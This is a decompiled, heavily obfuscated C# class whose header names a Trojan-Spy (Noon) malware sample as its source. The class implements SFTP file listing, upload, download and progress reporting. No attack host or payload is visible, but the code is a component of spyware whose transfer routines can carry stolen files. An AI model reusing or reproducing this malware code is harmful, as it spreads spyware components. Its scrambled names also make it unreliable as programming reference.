// Decompiled with JetBrains decompiler
// Type: +E4rz;x.:1/mGF/
// Assembly: ;8w1LFr, Version=5.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35
// MVID: 2CC07ADF-5A94-44BC-9C37-07435DAD286F
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.04\HEUR-Trojan-Spy.Win32.Noon.pef-7dfe305f31c1f571790f54c3522eb8c6066453e69a429782ebfc0d6f68b2ae34.exe

using \u0024\u003FQhZa5;
using \u0029XX\u002FH9j;
using \u002BLt\u00215hX;
using \u002BtqrL9p;
using \u002Fyk\u002A0\u005EA;
using \u0037Eo2gox;
using \u0038\u003BgzIAY;
using \u003947gO\u0023h;
using \u003B8w1LFr;
using \u005E_3e\u0024j\u002A;
using \u005E78a\u002A\u003A5;
using \u007E\u002B\u005EJ0Pi;
using b\u00401QD\u002D\u002A;
using cRsUvx1;
using d3Ghlru;
using h\u005E\u002Bk\u002F7\u003B;
using i7EM\u003F6s;
using iQH1\u002B3x;
using j\u003BMx7nm;
using jqtJHJP;
using jz\u002BXfZx;
using M\u003Bs\u005E8\u007EV;
using qNFetXN;
using qNu\u003As\u007EV;
using System;
using System.Collections;
using System.IO;
using System.Text.RegularExpressions;
using T\u007EUmW\u003Af;
using U\u002A\u002F71qd;
using VH7lW\u00246;
using Y\u002F\u0023AR\u0023i;

namespace \u002BE4rz\u003Bx
{
  internal class \u003A1\u002FmGF\u002F : Bpv\u002A\u002D\u002BP
  {
    private NAwnAxL \u0023\u002Ds2\u002AS\u002F;
    private NAwnAxL.m7O6\u0040fn rSiZIaH;
    private G\u002F\u005E\u0040\u0027\u003B\u002A \u007E\u002BM3Vn\u003F;
    private \u0027efagel FpqXgQH;
    private char[] b\u00401Z\u002FKN;

    protected override void CheckAborted()
    {
      if (((TcyGQBN.d59\u005E\u0040\u007E\u0029<>) this.rSiZIaH).get_Aborting())
        throw new ZrwFpFW(sgxPeiI.LiHKl\u0027x(":\u0019 \u007F\u0004(\u001D(\u000680,\u0016Gj\u000F\u0002e>\t7\n.\u0002(w", "FYmwCpPrOdqkPO5"), (Exception) null, B\u003FXMot\u002D.OperationAborted);
    }

    protected override Exception GetAbortException(Exception ex)
    {
      if (ex == null)
        return (Exception) null;
      return ex.InnerException is ZrwFpFW innerException && ((\u003BMMaZPa) innerException).get_Status() == B\u003FXMot\u002D.OperationAborted ? (Exception) new ZrwFpFW(innerException) : (Exception) null;
    }

    protected virtual bool uS\u002FRQxj => true;

    protected override aE7ouUg GetRemoteFileItemInfo(
      string remotePath,
      bool followSymlinks,
      bool failIfNotFound,
      object expectedRemoteItem)
    {
      \u0024\u0027\u002DClxU clxU = this.\u0023\u002Ds2\u002AS\u002F.cD\u007Ef\u002BB0(remotePath, failIfNotFound, followSymlinks);
      return clxU == null ? (aE7ouUg) null : new aE7ouUg((object) clxU, clxU.jpN8\u0029xz, remotePath, clxU.\u0030We6LVX, clxU.lVWSmEV, clxU.ufa\u002FED\u002A, clxU.QuA\u002D\u002B4V, clxU.LVsY\u00277W);
    }

    protected override aE7ouUg GetRemoteFileItemInfo(
      string remotePath,
      object expectedRemoteItem)
    {
      return this.GetRemoteFileItemInfo(remotePath, false, false, expectedRemoteItem);
    }

    protected override int AppendRemoteFileList(
      ArrayList dirs,
      ArrayList files,
      Oe_\u0027c\u003B\u0026 remotePathInfo,
      Regex nameFilter,
      bool appendDirs,
      bool isXCopy,
      string remotePath,
      string localPath)
    {
      files.Add((object) new gH\u002AMt\u00217((object) null, ((gH\u002AMt\u00217) remotePathInfo).get_Name(), remotePathInfo.W\u003AtAz\u003Fn, 0L, true));
      rrcp5ES rrcp5Es = this.\u0023\u002Ds2\u002AS\u002F.OPL28\u002BX(remotePathInfo.W\u003AtAz\u003Fn, this.rSiZIaH.Rba\u0024\u002A8m);
      int count = files.Count;
      for (int index = 0; index < rrcp5Es.AaJbE\u002A_; ++index)
      {
        if (rrcp5Es.get_Item(index).lVWSmEV)
        {
          if (nameFilter == null || nameFilter.IsMatch(rrcp5Es.get_Item(index).jpN8\u0029xz))
          {
            files.Add((object) new gH\u002AMt\u00217((object) rrcp5Es.get_Item(index), rrcp5Es.get_Item(index).jpN8\u0029xz, rrcp5Es.get_Item(index).QuA\u002D\u002B4V));
            this._bytesTotal += rrcp5Es.get_Item(index).QuA\u002D\u002B4V;
          }
        }
        else if (rrcp5Es.get_Item(index).\u0030We6LVX || rrcp5Es.get_Item(index).ufa\u002FED\u002A)
        {
          if ((appendDirs || !rrcp5Es.get_Item(index).ufa\u002FED\u002A) && (nameFilter == null || isXCopy || nameFilter.IsMatch(rrcp5Es.get_Item(index).jpN8\u0029xz)))
          {
            if (remotePathInfo.Bo\u002Di3pf == null)
              dirs.Add((object) new Oe_\u0027c\u003B\u0026(rrcp5Es.get_Item(index).jpN8\u0029xz, this.PathCombine(remotePathInfo.W\u003AtAz\u003Fn, rrcp5Es.get_Item(index).jpN8\u0029xz, true), (string) null, rrcp5Es.get_Item(index).\u0030We6LVX));
            else
              dirs.Add((object) new Oe_\u0027c\u003B\u0026(rrcp5Es.get_Item(index).jpN8\u0029xz, this.PathCombine(remotePathInfo.W\u003AtAz\u003Fn, rrcp5Es.get_Item(index).jpN8\u0029xz, true), this.PathCombine(remotePathInfo.Bo\u002Di3pf, rrcp5Es.get_Item(index).jpN8\u0029xz, true), rrcp5Es.get_Item(index).\u0030We6LVX));
          }
        }
        else
        {
          string remotePath1 = this.PathCombine(remotePath, rrcp5Es.get_Item(index).jpN8\u0029xz, true);
          string localPath1 = this.PathCombine(localPath, rrcp5Es.get_Item(index).jpN8\u0029xz, false);
          this.HandleException(this.CreateBatchException(string.Format(sgxPeiI.LiHKl\u0027x("'\u0005 2K1\vz\t#-c\u0019G{\a\u001D \u007F\u0004*X>\u000E>< \f\bo\u0017Qmx\u0010h\u0005}Nb", "FYmwCpPrOdqkPO5"), (object) remotePath1), (Exception) null, Sk_\u002B\u002FO\u0029.NotFileOrDirectory, remotePath1, localPath1), Sk_\u002B\u002FO\u0029.NotFileOrDirectory, remotePath1, localPath1, W44\u003BZ\u003As.ThrowException, W44\u003BZ\u003As.Skip, out W44\u003BZ\u003As _);
        }
      }
      return files.Count - count;
    }

    protected virtual char l\u002B\u00254IU\u002F => '/';

    protected virtual char RSE\u002A6HM => this.\u0023\u002Ds2\u002AS\u002F.\u00373Nj\u002Df\u003F == iQtvVz\u002F.Windows ? '\\' : '/';

    protected virtual char[] \u002F\u003F_xvbb
    {
      get
      {
        if (this.b\u00401Z\u002FKN == null)
        {
          int length = NAwnAxL.v\u0023jHKGL.Length;
          this.b\u00401Z\u002FKN = new char[length + ((int) this.\u0026hZ\u00400xR != (int) this.\u003758WA\u005E\u007E ? 5 : 4)];
          Array.Copy((Array) NAwnAxL.v\u0023jHKGL, 0, (Array) this.b\u00401Z\u002FKN, 0, length);
          this.b\u00401Z\u002FKN[length] = '*';
          this.b\u00401Z\u002FKN[length + 1] = '?';
          this.b\u00401Z\u002FKN[length + 2] = ':';
          this.b\u00401Z\u002FKN[length + 3] = this.\u0026hZ\u00400xR;
          if ((int) this.\u0026hZ\u00400xR != (int) this.\u003758WA\u005E\u007E)
            this.b\u00401Z\u002FKN[length + 4] = this.\u003758WA\u005E\u007E;
        }
        return this.b\u00401Z\u002FKN;
      }
    }

    protected override bool IsInnerObjectUsable() => this.\u0023\u002Ds2\u002AS\u002F.c\u0025vxk2f == \u0025lN\u0029\u002F\u0021t.Ready;

    protected override Exception CreateException(string message, Exception ex) => ex is ZrwFpFW inner ? (Exception) new ZrwFpFW(message, inner, B\u003FXMot\u002D.OperationFailure, 0L) : (Exception) new ZrwFpFW(message, ex, B\u003FXMot\u002D.OperationFailure);

    protected override Exception CreateBatchException(
      string message,
      Exception ex,
      Sk_\u002B\u002FO\u0029 type,
      string remotePath,
      string localPath)
    {
      return ex is ZrwFpFW sftpException ? (Exception) new HP\u002F\u003BJSM(message, sftpException, (UUu1dhA) type, remotePath, localPath) : (Exception) new HP\u002F\u003BJSM(message, ex, (UUu1dhA) type, remotePath, localPath);
    }

    protected override void CreateRemoteDirectory(string remotePath, string localPath) => this.\u0023\u002Ds2\u002AS\u002F.\u0034\u005ET\u002A7He(remotePath);

    protected override long PutFile(
      object localItem,
      object remoteItem,
      string localPath,
      string remotePath,
      bool overwrite)
    {
      return this.\u0023\u002Ds2\u002AS\u002F.SCjvuGD(roqVRkk.Truncate, this.rSiZIaH.Rba\u0024\u002A8m, remotePath, localPath, 0L, 0L, -1L);
    }

    protected override long PutFile(
      object localItem,
      object remoteItem,
      string localPath,
      string remotePath,
      long localOffset,
      long remoteOffset)
    {
      return this.\u0023\u002Ds2\u002AS\u002F.SCjvuGD(roqVRkk.None, this.rSiZIaH.Rba\u0024\u002A8m, remotePath, localPath, remoteOffset, localOffset, -1L);
    }

    protected override long GetFile(
      object remoteItem,
      object localItem,
      string remotePath,
      string localPath,
      bool overwrite)
    {
      return this.\u0023\u002Ds2\u002AS\u002F.RA\u003FcJR8(FileMode.Create, this.rSiZIaH.Rba\u0024\u002A8m, remotePath, localPath, 0L, 0L, -1L);
    }

    protected override long GetFile(
      object remoteItem,
      object localItem,
      string remotePath,
      string localPath,
      long remoteOffset,
      long localOffset)
    {
      return this.\u0023\u002Ds2\u002AS\u002F.RA\u003FcJR8(FileMode.OpenOrCreate, this.rSiZIaH.Rba\u0024\u002A8m, remotePath, localPath, remoteOffset, localOffset, -1L);
    }

    protected override void OnBatchTransferProblemDetected(
      \u0029z5LT\u0021n e,
      aE7ouUg remoteInfo,
      aE7ouUg localInfo)
    {
      if (this.\u007E\u002BM3Vn\u003F == null)
        return;
      DateTime minValue1 = DateTime.MinValue;
      long remoteFileLength;
      DateTime minValue2;
      if (remoteInfo == null)
      {
        remoteFileLength = -1L;
        minValue2 = DateTime.MinValue;
      }
      else
      {
        remoteFileLength = remoteInfo.BmIBRw\u002B;
        minValue2 = remoteInfo.\u0038igTswj;
      }
      long localFileLength;
      DateTime minValue3;
      if (localInfo == null)
      {
        localFileLength = -1L;
        minValue3 = DateTime.MinValue;
      }
      else
      {
        localFileLength = localInfo.BmIBRw\u002B;
        minValue3 = localInfo.\u0038igTswj;
      }
      \u002F8wzwNh e1 = new \u002F8wzwNh(((\u0025P\u003F1hnB) e).get_Exception() as HP\u002F\u003BJSM, this._putFile ? \u0036X\u0023pVe1.Uploading : \u0036X\u0023pVe1.Downloading, (f\u0029oykkN) e.\u002F\u0029rryUh, (f\u0029oykkN) e.Bp\u007E\u002A\u002F\u002Bq, remoteFileLength, minValue2, localFileLength, minValue3, this._putFile ? this.\u0025_kGRlx : Bpv\u002A\u002D\u002BP.\u003AW1\u002Df\u002A\u002A);
      this.\u007E\u002BM3Vn\u003F((object) this.\u0023\u002Ds2\u002AS\u002F, e1);
      e.\u002F\u0029rryUh = (W44\u003BZ\u003As) e1.\u002Ar_tsP\u0025;
      e.a\u002F\u0023\u003AYp\u002F = e1.\u0037G\u0029E\u0023ki;
    }

    protected override void OnBatchTransferProgress(
      s5d\u0027Qw\u002D operation,
      string remotePath,
      string localPath)
    {
      this.OnBatchTransferProgress(operation, (aE7ouUg) null, remotePath, localPath);
    }

    protected override void OnBatchTransferProgress(
      s5d\u0027Qw\u002D operation,
      aE7ouUg transferringFileInfo,
      string remotePath,
      string localPath)
    {
      if (this.FpqXgQH == null)
        return;
      this.FpqXgQH((object) this.\u0023\u002Ds2\u002AS\u002F, new \u003BMMaZPa(this._putFile ? \u0036X\u0023pVe1.Uploading : \u0036X\u0023pVe1.Downloading, (\u0021Xn\u002Fp\u002D9) operation, remotePath, localPath, transferringFileInfo == null ? -1L : transferringFileInfo.BmIBRw\u002B, transferringFileInfo == null ? DateTime.MinValue : transferringFileInfo.\u0038igTswj, this._filesTotal, this._filesProcessed, this._filesTransferred, this._bytesTotal, this._bytesProcessed));
    }

    internal static Regex Pv\u003A9biR(string _param0, bool Gkclrbq)
    {
      RegexOptions options = !Gkclrbq ? RegexOptions.IgnoreCase : RegexOptions.None;
      _param0 = Regex.Escape(_param0);
      _param0 = _param0.Replace(sgxPeiI.LiHKl\u0027x("2[", "FYmwCpPrOdqkPO5"), sgxPeiI.LiHKl\u0027x("@[", "FYmwCpPrOdqkPO5")).Replace(sgxPeiI.LiHKl\u0027x("2N", "FYmwCpPrOdqkPO5"), sgxPeiI.LiHKl\u0027x("@", "FYmwCpPrOdqkPO5"));
      return new Regex(sgxPeiI.LiHKl\u0027x("0", "FYmwCpPrOdqkPO5") + _param0 + sgxPeiI.LiHKl\u0027x("J", "FYmwCpPrOdqkPO5"), options);
    }
  }
}
